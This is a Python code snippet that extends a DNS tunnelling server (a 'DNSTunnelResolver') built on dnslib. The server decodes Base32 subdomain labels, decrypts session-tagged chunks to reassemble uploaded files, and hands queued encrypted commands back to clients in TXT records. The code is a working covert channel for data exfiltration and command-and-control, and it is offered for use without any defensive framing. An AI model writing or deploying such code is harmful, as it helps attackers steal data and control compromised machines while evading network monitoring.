# Add TXT and TEXT to your dnslib imports
from dnslib import DNSRecord, QTYPE, RR, A, TXT, TEXT
import struct
import base64
import time

# Inside your DNSTunnelResolver.__init__, add a downstream command queue:
# self.downstream_messages = defaultdict(list)  # session_key -> [bytes_message1, bytes_message2]

def resolve(self, request: DNSRecord, handler):
    self.request_counter += 1
    reply = request.reply()
    src_ip = handler.client_address[0]

    if self._is_blocked(src_ip):
        reply.add_answer(RR(request.q.qname, QTYPE.A, ttl=1, rdata=A("127.0.0.1")))
        return reply

    qname = str(request.q.qname).rstrip(".").lower()
    qtype = QTYPE[request.q.qtype]
    
    # Track the operational session ID for potential downstream replies
    active_session_key = None

    if qname.endswith(self.domain):
        prefix = qname[: -(len(self.domain) + 1)]
        payload_label = prefix.replace(".", "").upper()

        # Reconstruct Base32 padding
        pad_len = (-len(payload_label)) % 8
        payload_label += "=" * pad_len

        try:
            raw = base64.b32decode(payload_label)
            if len(raw) >= 16:
                session_id = raw[:16]
                active_session_key = session_id.hex()
                ciphertext = raw[16:]
                
                # Decrypt upstream payload
                plaintext = self.crypto.decrypt(ciphertext, session_id)
                seq_num, is_last, data_len = struct.unpack("!HBB", plaintext[:4])
                actual_chunk_data = plaintext[4 : 4 + data_len]

                # (Keep your existing reassembly block here to reconstruct upstream files)
                print(f"[+] Received Upstream Frame {seq_num} for Session {active_session_key[:8]}")
                
        except Exception as exc:
            print(f"[-] Processing error: {exc}")
            self._record_failure(src_ip)

    # ------------------------------------------------------------------
    # DOWNSTREAM STREAMING PIPELINE
    # ------------------------------------------------------------------
    # If the client is requesting a TXT record and we have a valid session context
    if qtype == "TXT" and active_session_key and self.downstream_messages[active_session_key]:
        try:
            # Fetch the next pending raw message for this client
            raw_downstream_data = self.downstream_messages[active_session_key].pop(0)
            
            # Encrypt the downstream payload using the derived session key
            # Format output: nonce + ciphertext + GCM tag + HMAC
            encrypted_response = self.crypto.encrypt(raw_downstream_data, bytes.fromhex(active_session_key))
            
            # Encode response to Base32 to ensure it passes cleanly through any intermediate recursive resolvers
            b32_response = base64.b32encode(encrypted_response).decode("utf-8").rstrip("=")
            
            # Inject the payload into the DNS response TXT field
            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=1, rdata=TXT(b32_response)))
            print(f"[->] Dispatched downstream message chunk ({len(b32_response)} bytes encoded)")
            return reply
        except Exception as e:
            print(f"[-] Failed to prepare downstream packet: {e}")

    # Fallback default response if no downstream payload is queued
    reply.add_answer(RR(request.q.qname, QTYPE.A, ttl=1, rdata=A("8.8.8.8")))
    return reply